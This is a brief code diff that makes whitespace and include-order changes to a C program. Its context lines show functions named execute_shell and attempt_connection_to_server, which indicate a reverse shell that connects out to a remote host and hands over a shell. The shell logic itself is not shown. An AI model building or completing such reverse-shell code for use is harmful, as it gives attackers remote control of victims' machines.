@@ -1,7 +1,7 @@
-#include <sys/socket.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <sys/socket.h>
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -51,10 +51,9 @@ void execute_shell(int socket_fd)
     }
 }
 
-
-
 int attempt_connection_to_server(char *remote_address){
-	// Create addr struct
+	
+    // Create addr struct
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
     addr.sin_port = htons(REMOTE_PORT);    // Port
@@ -68,7 +67,7 @@ int attempt_connection_to_server(char *remote_address){
 
     int connection_failed = 1;
 
-	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1)
+    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1)
     {
 		close(sock);
 		return -1;
